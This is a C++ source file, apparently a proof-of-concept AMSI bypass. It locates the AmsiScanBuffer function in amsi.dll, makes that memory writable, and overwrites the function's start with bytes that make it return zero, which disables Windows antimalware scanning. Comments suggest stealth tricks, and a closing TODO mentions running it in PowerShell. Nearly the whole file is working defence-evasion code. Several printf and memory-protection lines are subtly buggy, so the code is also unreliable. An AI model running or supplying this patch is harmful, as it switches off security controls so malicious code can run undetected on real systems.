// umsi_bypass.cpp 
// https://blog.f-secure.com/hunting-for-amsi-bypasses/

#include <iostream>
#include <windows.h>


/*
AmsiCloseSession
AmsiInitialize
AmsiOpenSession
AmsiScanBuffer
AmsiScanString
AmsiUacInitialize
AmsiUacScan
AmsiUacUninitialize
DllCanUnloadNow
*/

int main()
{
	// don't actually need to include ".dll" substring, for that extra stealth
	printf("[*] Loading amsi.dll library\n");
	HMODULE amsi_hmodule = LoadLibrary(TEXT("amsi"));
	if (amsi_hmodule == NULL) {
		printf("[*] Error: unable to load amsi.dll library.\n");
		printf("[*] Your error is :", GetLastError());
		return 0;
	}

    printf("[*] Attempting to get handle of amsi.dll\n");
	LPVOID func_addr = GetProcAddress(amsi_hmodule, "AmsiScanBuffer");
	if (func_addr == NULL) {
		printf("[*] Error: the AmsiScanBuffer function was not found inside amsi.dll library.\n");
		printf("[*] Error is :", GetLastError());
		return 0;
	}
	printf("[*] Got AmsiScanBuffer function address\n");
	printf("[*] AmsiScanBuffer at %p\n", func_addr);
	printf("[*] Calculating difference between dll base address and function address\n");
	int test = (LONG *)func_addr - (LONG *)amsi_hmodule;
	printf("[*] Difference is %d\n", test);
	// offset is +5196

	printf("[*] For more stealth, use this offset instead of GetProcAddress.\n");

	printf("[*] Attempting change of memory allocation for this function.\n");

	DWORD old; // don't actually care about this
	BOOL vp = VirtualProtect(func_addr, 32, PAGE_READWRITE, &old);
	if (vp == 0) {
		printf("[*] Error changing memory allocation\n");
		printf("[*] Error is ", GetLastError());
	}
	printf("Old virtualprotect value was %d.\n", old);

	printf("VirtualProtect success, changed memory allocation\n");
	char rewrite[] = "\x33\xc0\xc3"; // xor eax, eax; ret; - 
	memcpy(func_addr, rewrite, strlen(rewrite));	

	printf("[*] Attempting second change of memory allocation for this function.\n");
	DWORD useless;
	BOOL new_vp = VirtualProtect(func_addr, 32, old, &useless);
	if (new_vp == 0) {
		printf("[*] Error changing memory allocation\n");
		printf("[*] Error is ", GetLastError());
	}
	printf("[*] Second VirtualProtect success, changed memory allocation.\n");
	printf("[*] AMSI be disabled now.\n");

}
// TODO: patch the AmsiScanBuffer function to return 0 and this should bypass amsi. 
// run it somehow in powershell